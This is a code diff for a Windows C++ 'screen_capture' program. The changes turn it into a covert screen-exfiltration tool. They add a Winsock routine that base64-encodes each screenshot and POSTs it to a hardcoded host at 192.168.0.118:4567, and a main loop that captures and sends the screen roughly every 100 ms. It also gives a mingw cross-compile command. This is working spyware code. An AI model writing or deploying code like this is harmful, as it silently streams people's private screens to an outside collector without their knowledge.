@@ -1,9 +1,10 @@
 #include <iostream>
+#include <sstream>
 #include <string>
 #include <windows.h>
 #include <unistd.h>
 #include <memory>
-#include <curl/curl.h>
+#include <winsock2.h>
 
 using namespace std;
 
@@ -14,14 +15,43 @@ using namespace Gdiplus;
 //------------------------------------------------------------------------------
 //------------------------------------------------------------------------------
 
+int send_post(string encoded) {
+    WSADATA wsaData;
+
+    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+        return 1;
+    }
+
+    SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    struct hostent *host;
+    host = gethostbyname("192.168.0.118");
+    SOCKADDR_IN SockAddr;
+    SockAddr.sin_port = htons(4567);
+    SockAddr.sin_family = AF_INET;
+    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
+
+    if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0){
+        return 1;
+    }
+
+    ostringstream stream;
+    stream << "POST / HTTP/1.1\r\nHost: 192.168.0.118\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " << (encoded.length()+1) << "\r\n\r\nimage=" << encoded;
+    string request = stream.str();
+    send(Socket, request.c_str(), request.length(), 0);
+
+    closesocket(Socket);
+    WSACleanup();
+
+    return 0;
+}
+
+//------------------------------------------------------------------------------
+//------------------------------------------------------------------------------
+
 static const std::string base64_chars =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
     "abcdefghijklmnopqrstuvwxyz"
-    "0123456789+/";
-
-static inline bool is_base64(unsigned char c) {
-    return (isalnum(c) || (c == '+') || (c == '/'));
-}
+    "0123456789-_";
 
 std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
     std::string ret; int i = 0; int j = 0; unsigned char char_array_3[3]; unsigned char char_array_4[4];
@@ -51,9 +81,6 @@ std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_
 
         for (j = 0; (j < i + 1); j++)
             ret += base64_chars[char_array_4[j]];
-
-        while((i++ < 3))
-            ret += '=';
     }
 
     return ret;
@@ -131,23 +158,30 @@ void capture_screen() {
     BitBlt(hCaptureDC, 0, 0, width, height, hDesktopDC, 0, 0, SRCCOPY|CAPTUREBLT);
 
     Bitmap bpm_screen(hCaptureBitmap, (HPALETTE)1);
+
+    ReleaseDC(hDesktopWnd, hDesktopDC);
+    DeleteDC(hCaptureDC);
+    DeleteObject(hCaptureBitmap);
+
     bpm_screen.Save(L"image.jpg", &jpgClsid, NULL);
 
     const string to_encode = file_to_string("image.jpg");
     string encoded = base64_encode(reinterpret_cast<const unsigned char*>(to_encode.c_str()), to_encode.length());
 
-    ReleaseDC(hDesktopWnd, hDesktopDC);
-    DeleteDC(hCaptureDC);
-    DeleteObject(hCaptureBitmap);
+    send_post(encoded);
 }
 
 //------------------------------------------------------------------------------
 //------------------------------------------------------------------------------
 
 int main() {
-    capture_screen();
+    while (true) {
+        capture_screen();
+
+        usleep(1000 * 100);
+    }
 
     return 0;
 }
 
-// i586-mingw32msvc-g++ -o screen_capture.exe screen_capture.cpp -L./gdi/lib -lgdi32 -lgdiplus
+// i586-mingw32msvc-g++ -o screen_capture.exe screen_capture.cpp -L./gdi/lib -lgdi32 -lgdiplus -lws2_32
